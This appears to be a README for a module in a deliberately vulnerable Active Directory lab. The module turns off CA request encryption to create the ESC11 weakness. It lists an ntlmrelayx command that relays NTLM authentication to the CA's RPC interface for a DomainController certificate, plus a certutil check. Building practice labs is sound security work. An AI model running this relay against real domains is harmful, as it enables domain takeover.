# esc11

CA accepts unencrypted ICertPassage requests (IF_ENFORCEENCRYPTICERTREQUEST off, ESC11). Sets `adcs.enforce_encrypt` to `off` on a host providing `adcs`.

Attack:

Relay NTLM authentication to the CA RPC interface:

    ntlmrelayx.py -t rpc://<ca ip> -rpc-mode ICPR -icpr-ca-name <NB>-CA -smb2support --template DomainController

How to verify:

    certutil -getreg CA\InterfaceFlags   # IF_ENFORCEENCRYPTICERTREQUEST missing when enabled

Disable restores the value declared for the host in the lab's `base_settings`.
